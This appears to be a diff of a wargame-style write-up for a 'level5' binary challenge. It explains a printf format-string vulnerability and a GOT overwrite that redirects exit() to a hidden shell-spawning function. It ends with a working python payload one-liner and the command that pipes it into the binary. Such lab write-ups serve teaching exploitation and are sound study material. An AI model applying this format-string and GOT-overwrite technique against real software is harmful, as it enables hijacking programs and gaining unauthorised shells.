@@ -1,6 +1,36 @@
-# We use an exploitation of printf format specifier.
-# We override the GOT entry for exit function with the "o" function one.
-# Instead of the exit, the function "o" with the critical section will be called, and so a shell will be launched
+## Analysis
+
+The program calls fgets(), which is a secured function against buffer overflow. Then it prints the buffer and exit with 1.
+
+In the codebase, there is a function <o> which isn't tied to the regular control flow. If called, a shell is launched.
+
+`0x080484aa <+6>:     mov    DWORD PTR [esp],0x80485f0`
+`0x080484b1 <+13>:    call   0x80483b0 <system@plt>`
+
+## Exploit
+
+Format string + GOT overwrite : the printf is called directly with the user-provided input so we can use the %n formatter to write into an address an arbitrary value.
+We'll overwrite a GOT entry with a one which better suits our needs.
+
+`0x080484f3 <+49>:    call   0x8048380 <printf@plt>`
+
+
+## Crafting
+
+0		   4			  15		17	     19
+[TARGET_MEMORY_ADDR][RANDOM_PADDING_STRING][$_FORMATTER][%N_FORMATTER]
+	^					^		^
+	| 3.write(134513824)			|    1.read     |		   2.fetch
+	|					----------------------- printf() ------------ stack[3] (TARGET_MEMORY_ADDR)
+	|							         |
+	------------------------------------------------------------------
+
+We provide the %n formatter to printf(). This one let us write into the following argument the number of characters written before meeting it.
+We use the $x formatter to access the 4th argument on the stack, which is the beginning of our buffer.
+Our buffer head is the memory addres of the exit got that we want to intervene its value with the <o> one.
+We pad our buffer we enough noise to match the value of <o> thanks to printf padding (134513824 in the current case).
+
+## Shooting
 
 python -c 'print "\x38\x98\x04\x08" +"%134513824x" + "%4$n"' > /tmp/payload_level5
 cat /tmp/payload_level5 - | ./level5
